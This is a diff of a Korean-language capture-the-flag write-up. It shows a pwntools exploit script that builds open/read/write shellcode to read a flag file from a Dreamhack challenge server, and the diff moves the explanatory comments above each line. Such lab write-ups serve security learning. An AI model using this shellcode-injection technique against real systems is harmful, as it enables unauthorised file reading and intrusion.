@@ -82,37 +82,38 @@ sc = (void *)shellcode; 이다.
 다음은 해당 문제에 대한 exploit script로, 파이썬 모듈 중 pwntools를 사용하여 작성하였다. 
 
 ```python
-from pwn import* 
 # importing pwntools
-p = remote('host1.dreamhack.games',10732) 
+from pwn import* 
+
 # 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 인자는 각각 호스트와 포트넘버이다.
+p = remote('host1.dreamhack.games',10732) 
 
-context.arch = 'amd64' 
 #공격 대상 아키텍쳐는 x86-64
+context.arch = 'amd64' 
 
-path = "/home/shell_basic/flag_name_is_loooooong"
 #flag 위치와 이름
+path = "/home/shell_basic/flag_name_is_loooooong"
 
-code = ''
 #셸코드 선언
+code = ''
 
-code += shellcraft.open(path,0 ,0)
 #shellcraft를 이용하여 open system call의 셸코드를 사용.
+code += shellcraft.open(path,0 ,0)
 
-code += shellcraft.read('rax','rsp',0x1000)
 #shellcraft를 이용하여 read system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
 #fd 인자로 rax를 쓰는 이유는 open syscall의 반환 값이 rax에 저장되기 때문이다. 주의해야할 점은 buffer 인자로 (rsp-count)가 아니라 rsp 값을 대입해야한다.
+code += shellcraft.read('rax','rsp',0x1000)
 
-code += shellcraft.write(1,'rsp',0x1000)
 #shellcraft를 이용하여 write system call의 셸코드를 사용. 인자는 fd,buffer,count 순이다. 
 #인자가 read와 같다.
+code += shellcraft.write(1,'rsp',0x1000)
 
-print(p.recv())
 #출력데이터 받아서 출력.
+print(p.recv())
 
-p.send(asm(code))
 #작성한 셸코드를 기계어로 변환 후 전송
+p.send(asm(code))
 
-print(p.recvuntil('}'))
 #플래그 형식은 DH{...}이므로 출력데이터를 '}'가 출력될 때까지 받아서 출력. 
+print(p.recvuntil('}'))
 ```
